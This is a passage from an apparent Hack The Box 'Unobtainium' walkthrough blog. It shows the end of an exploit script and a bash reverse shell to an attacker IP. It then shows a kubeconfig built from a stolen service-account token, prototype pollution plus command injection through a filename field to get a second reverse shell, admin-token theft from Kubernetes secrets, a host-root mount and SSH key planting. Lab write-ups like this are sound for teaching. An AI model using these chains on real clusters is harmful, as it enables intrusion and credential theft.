<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-c"</span><span class="p">,</span> <span class="s">'--command'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Send blind System Command"</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">read_file</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">read_file</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">read_file</span><span class="p">))</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">U</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">send_proto</span><span class="p">())</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">command</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">exec_cmd</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">command</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Try python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> -h"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'User has exited the program'</span><span class="p">)</span>
</pre></table></code></div></div><p>And finally get reverse shell</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ python exploit.py <span class="nt">-c</span> <span class="s1">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/10.10.15.71/4141 0&gt;&amp;1"'</span>
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/rev-shell.png" alt="" data-proofer-ignore></p><h1 id="privesc">Privesc</h1><ul><li>We are inside kubentes container<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Container Platform ...... kubentes
</pre></table></code></div></div></ul><p>There is a crontab <code class="language-plaintext highlighter-rouge">/var/spool/cron/crontabs/root</code> running from root inside container</p><p><img data-src="/assets/img/posts/unobtainium/cron-in-kube.png" alt="" data-proofer-ignore></p><p>This crontab is removing any file/binary with name “kubectl”. That means this container don’t want us to install <code class="language-plaintext highlighter-rouge">kubectl</code> command in this container.</p><h2 id="kubernetes"><span class="mr-2">Kubernetes</span><a href="#kubernetes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://kubernetes.io/">Kubernetes</a> is an open-source container orchestration platform that enables the operation of an elastic web server framework for cloud applications. <strong>Source</strong> <a href="https://www.vmware.com/topics/glossary/content/kubernetes">vmware.com</a></p><p><strong><a href="https://www.vmware.com/topics/glossary/content/kubernetes-cluster">Cluster</a>:</strong> A Kubernetes cluster is a set of nodes that run containerized applications. Multiple computer network or a supercomputer with tone of resources divided into small nodes.</p><p><strong><a href="https://kubernetes.io/docs/concepts/architecture/nodes/">Node</a>:</strong> Kubernetes runs your workload by placing containers into Pods to run on Nodes. A node may be a virtual or physical machine, depending on the cluster.</p><p><strong><a href="https://kubernetes.io/docs/concepts/workloads/pods/">Pods</a>:</strong> Pod is similar to a group of Docker containers with shared namespaces and shared filesystem volumes.</p><p><strong><a href="https://kubernetes.io/docs/concepts/containers/">Containers</a>:</strong> A container is a standard unit of software that packages up code and all its dependencies required for a application to run.</p><p><img data-src="/assets/img/posts/unobtainium/Kubernetes.png" alt="" data-proofer-ignore></p><h3 id="service-account"><span class="mr-2">Service Account</span><a href="#service-account" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>From <a href="https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#service-account-tokens">hacktricks notes</a></p><p>ServiceAccount is an object managed by Kubernetes and used to provide an identity for processes that run in a pod. Every service account has a secret related to it and this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.</p><p>Usually in the directory <code class="language-plaintext highlighter-rouge">/run/secrets/kubernetes.io/serviceaccount</code> or <code class="language-plaintext highlighter-rouge">/var/run/secrets/kubernetes.io/serviceaccount</code> you can find the files:</p><ul><li><code class="language-plaintext highlighter-rouge">ca.crt</code>: It’s the ca certificate to check kubernetes communications<li><code class="language-plaintext highlighter-rouge">namespace</code>: It indicates the current namespace<li><code class="language-plaintext highlighter-rouge">token</code>: It contains the service token of the current pod.</ul><p><img data-src="/assets/img/posts/unobtainium/kube-service-ac.png" alt="" data-proofer-ignore></p><h2 id="kubectl"><span class="mr-2">Kubectl</span><a href="#kubectl" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1<li>https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/</ul><h3 id="connect-to-kubernetes-api"><span class="mr-2">Connect to Kubernetes api</span><a href="#connect-to-kubernetes-api" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Found blog for <a href="http://docs.shippable.com/deploy/tutorial/create-kubeconfig-for-self-hosted-kubernetes-cluster/">create kubeconfig</a></p><ul><li><code class="language-plaintext highlighter-rouge">token</code> came from <code class="language-plaintext highlighter-rouge">/run/secrets/kubernetes.io/serviceaccount/token</code><li><code class="language-plaintext highlighter-rouge">certificate-authority-data</code> came form <code class="language-plaintext highlighter-rouge">/run/secrets/kubernetes.io/serviceaccount/ca.crt</code> in base64 encoded format</ul><div class="language-yaml highlighter-rouge"><div class="code-header"> <span data-label-text="YAML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
<span class="na">kind</span><span class="pi">:</span> <span class="s">Config</span>
<span class="na">users</span><span class="pi">:</span>
<span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">poorduck</span>
  <span class="na">user</span><span class="pi">:</span>
    <span class="na">token</span><span class="pi">:</span> <span class="s">eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA</span>
<span class="na">clusters</span><span class="pi">:</span>
<span class="pi">-</span> <span class="na">cluster</span><span class="pi">:</span>
    <span class="na">certificate-authority-data</span><span class="pi">:</span> <span class="s">LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM1ekNDQWMrZ0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeE1ERXdOekV6TWpRME9Wb1hEVE14TURFd05qRXpNalEwT1Zvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTVRDCmozSE9PMXRhaE1PUHpkNjhuYUtoQmVpYUFaM2lxdC9TY25lZ1RnbEttdHo1RGFnRUQ1WWFqWk0rVXl2UEVxUSsKdSttYjFaYzFLYnJjMkZnM0M0OEJZN09JUDZHZk9YOTkwUERLSmhxWnRhT0FkY1U1R2ExYXZTK2wzZG82VjJrQwplVnN0d1g2U1ZJYnpHSkVVeE1VUGlac0Z0Nkhzdk43aHRQMVA1Z2V3d3Rnc1ZJWER5TGwvZVJmd0NuMlpXK24zCk5nQzRPSTg0empWSHBYbVhGYUdzZURIYi9FNHdLL04waE1EMERFVlBKc0VPb2dITTlMbmRVZ3lKbWhBdFdiRWoKMjUrSDhBd1FpMy84UFlORXNtdFNBVUV1V3RZMzZweC9zRDVDdGhpTmxOcGtCNXQ1YzFHSzkwRG15b2ZxQmdZdgo5d2tDTkdHWktwM0F4TU1OMm5zQ0F3RUFBYU5DTUVBd0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQTBHQ1NxR1NJYjMKRFFFQkN3VUFBNElCQVFBSEpqbzhVYzNTSDFVbnNLU3daSlR1eWozNlcvbXNiTXIwcFNuM2RsRTZCb3V1a2hGMwo5R3htVmEyYW40L1ZGSmtBc1pTcUZVejFlNTJxdkpvRkpjWGVjNE1pTjZHWlRXdVVBOUQvanFpYXBuSFdlTzh4ClJHazRXTjY2WnJhTTBYM1BxYUhvK2NiZmhLT2xMOWprVXh2RSszQld1ajlwbHlEM245dEZlM2xuYXNEZnp5NE0KcTQ2NWl4UFpxRnFWY2h4UUZRK3BaMjRLaXFvUVc0bWFtL3g1RlB5MTMrTXc4SjR6Yjh2TGR1dkxRUjN3cFVHYgp2S1hkbktPTFdzaUV4eXJqcFpqWmJZQkw4YjcwNVhGRkd2bWFicDIxYUc4cHNCMVh2c0xpR0ZRRXF5RGZlRlJXCmhsN0twVUlTbDQrTnA1c0FpWE53dGJTREUrMjJRVnRaYnVEbgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0t</span>
    <span class="na">server</span><span class="pi">:</span> <span class="s">https://10.10.10.235:8443/</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">unobtainium-cluster</span>
<span class="na">contexts</span><span class="pi">:</span>
<span class="pi">-</span> <span class="na">context</span><span class="pi">:</span>
    <span class="na">cluster</span><span class="pi">:</span> <span class="s">unobtainium-cluster</span>
    <span class="na">user</span><span class="pi">:</span> <span class="s">poorduck</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">context</span>
<span class="na">current-context</span><span class="pi">:</span> <span class="s">context</span>
<span class="na">preferences</span><span class="pi">:</span>
  <span class="na">colours</span><span class="pi">:</span> <span class="no">true</span>
</pre></table></code></div></div><p>Save this config file in the <code class="language-plaintext highlighter-rouge">~/.kube/config</code> and then we can access to Kubernetes api from our machine.</p><h3 id="enumeration-1"><span class="mr-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Follow-up with <a href="https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#using-kubectl">hacktricks notes</a></p><p>Check if we can read secret from current pod, but we don’t</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl get secrets <span class="nt">-o</span> yaml <span class="nt">-n</span> kube-system
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/secret-webapp-pod.png" alt="" data-proofer-ignore></p><p><strong>namespace:</strong> Kubernetes supports multiple virtual clusters backed by the same physical cluster. These virtual clusters are called namespaces.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl get namespaces
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/kube-namespace.png" alt="" data-proofer-ignore></p><p>There is a virtual clusters “dev”</p><p>Checking permission of Current Privileges in kubeernetes api, we can list “dev” cluster pods.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl auth can-i <span class="nt">--list</span> <span class="nt">-n</span> dev
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/kube-get-perms.png" alt="" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl get pods <span class="nt">-n</span> dev
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/kube-dev-pods.png" alt="" data-proofer-ignore></p><p>If we check one of the pod information, we can see that all pods are running a node application on port 3000. These are the replicas of the application that is running on public port 31337, Where we found the prototype pollution and command injection.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl describe pod &lt;pod_name&gt; <span class="nt">-n</span> dev
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/pod-service.png" alt="" data-proofer-ignore></p><p>We can verify that this is the same app by sending same todo request.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s1">'http://172.17.0.6:3000/todo'</span> <span class="nt">--data</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "todo.txt"}'</span> <span class="nt">-H</span> <span class="s1">'Content-type: application/json'</span>
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/pod-app.png" alt="" data-proofer-ignore></p><h2 id="root-shell-in-dev"><span class="mr-2">Root shell in Dev</span><a href="#root-shell-in-dev" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Setup socat listener to redirect local reverse shell to our machine.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./socat tcp-l:8080 tcp:10.10.14.15:443 &amp;
</pre></table></code></div></div><p>Exploit Prototype Pollution to enable upload funcnality</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-X</span> PUT <span class="s1">'http://172.17.0.10:3000'</span> <span class="nt">--data</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"},"message": {"text": "Prototype_Pollution", "__proto__": {"canUpload": true}}}'</span> <span class="nt">-H</span> <span class="s1">'Content-type: application/json'</span>
</pre></table></code></div></div><p>Exploit Command injection to get reverse shell</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s1">'http://172.17.0.10:3000/upload'</span> <span class="nt">--data</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "&amp; /bin/bash -c \"bash -i &gt;&amp; /dev/tcp/172.17.0.5/8080 0&gt;&amp;1\""}'</span> <span class="nt">-H</span> <span class="s1">'Content-type: application/json'</span>
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/pod-app-rev-shell.png" alt="" data-proofer-ignore></p><p><strong><em>Replace kubeconfig token with current pod token</em></strong></p><p>and From this pod’s Current Privileges <code class="language-plaintext highlighter-rouge">kubectl auth can-i --list</code>, We can read kubernetes secrets and found admin token</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl get secrets <span class="nt">-o</span> yaml <span class="nt">-n</span> kube-system
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/admin-token.png" alt="" data-proofer-ignore></p><h2 id="kubernetes-with-admin-token"><span class="mr-2">kubernetes with admin token</span><a href="#kubernetes-with-admin-token" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now if we check Current Privileges again from admin token, there is a extra rule and with that we can do all commands on all resources</p><p><img data-src="/assets/img/posts/unobtainium/admin-Privileges.png" alt="" data-proofer-ignore></p><p>with that we can edit cluster deployment config file and mount host root in the pod.</p><p>Edit <code class="language-plaintext highlighter-rouge">webapp-deployment</code> deployment config file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl edit deployment webapp-deployment
</pre></table></code></div></div><p>in <code class="language-plaintext highlighter-rouge">webapp-deployment</code> there is already a host volume <code class="language-plaintext highlighter-rouge">/opt/user/</code> is mounted in the deployment <code class="language-plaintext highlighter-rouge">/root</code></p><p><img data-src="/assets/img/posts/unobtainium/edit-deployment.png" alt="" data-proofer-ignore></p><p>here we can simply edit hostpath and replace with <code class="language-plaintext highlighter-rouge">/</code> and get host root filesystem in the container’s <code class="language-plaintext highlighter-rouge">/root</code></p><p>after edited check if deployment get restarted and new pods generated.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl get pods <span class="nt">--all-namespaces</span>
</pre></table></code></div></div><p>Here new problem comes, After adding host root filesystem in <code class="language-plaintext highlighter-rouge">webapp-deployment</code>, this cluster died in every minute and regenerate new pods again</p><p><img data-src="/assets/img/posts/unobtainium/deployment-in-loop.png" alt="" data-proofer-ignore></p><p>there seems to be a cron killing containers every minute.</p><p>We can put ssh key in the host <code class="language-plaintext highlighter-rouge">/root</code> after mounted in the pod under one minute and then ssh in.</p><p>Check new generated pod name with <code class="language-plaintext highlighter-rouge">kubectl get pods --all-namespaces</code></p><p>get inside that pod</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl <span class="nb">exec</span> <span class="nt">-it</span> webapp-deployment-7bd959c968-flvg2 <span class="nt">--</span> bash
</pre></table></code></div></div><p>And put ssh key</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">mkdir</span> /root/root/.ssh
<span class="nb">chmod </span>700 /root/root/.ssh
<span class="nb">echo</span> <span class="s2">"&lt;id_rsa.pub&gt;"</span> <span class="o">&gt;</span> /root/root/.ssh/authorized_keys
<span class="nb">chmod </span>600 /root/root/.ssh/authorized_keys
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/rooted.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/reversing/" class="post-tag no-text-decoration" >reversing</a> <a href="/tags/electron-application/" class="post-tag no-text-decoration" >electron application</a> <a href="/tags/deb-package/" class="post-tag no-text-decoration" >deb package</a> <a href="/tags/lodash-4-17-4/" class="post-tag no-text-decoration" >lodash 4.17.4</a> <a href="/tags/prototype-pollution/" class="post-tag no-text-decoration" >prototype pollution</a> <a href="/tags/google-cloudstorage-commands-0-0-1/" class="post-tag no-text-decoration" >google-cloudstorage-commands 0.0.1</a> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >command injection</a> <a href="/tags/kubernetes/" class="post-tag no-text-decoration" >kubernetes</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Unobtainium - Poorduck&amp;url=https://x00tex.github.io/posts/unobtainium/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Unobtainium - Poorduck&amp;u=https://x00tex.github.io/posts/unobtainium/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://x00tex.github.io/posts/unobtainium/&amp;text=Hackthebox - Unobtainium - Poorduck" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/meta/">Hackthebox - Meta</a><li><a href="/posts/pandora/">Hackthebox - Pandora</a><li><a href="/posts/writer/">Hackthebox - Writer</a><li><a href="/posts/blunder/">Hackthebox - Blunder</a><li><a href="/posts/luanne/">Hackthebox - Luanne</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/unicode/"><div class="card-body"> <em class="timeago small" data-ts="1638383400" > 2021-12-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unicode</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.126 hackmedia.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux...</p></div></div></a></div><div class="card"> <a href="/posts/writer/"><div class="card-body"> <em class="timeago small" data-ts="1639420200" > 2021-12-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Writer</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.101 writer.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; ...</p></div></div></a></div><div class="card"> <a href="/posts/unbalanced/"><div class="card-body"> <em class="timeago small" data-ts="1606156200" > 2020-11-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unbalanced</h3><div class="text-muted small"><p> Scanning Nmap ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.200 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/horizontall/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - Horizontall</p></a> <a href="/posts/sink/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox - Sink</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/p00rduck">p00rduck</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" 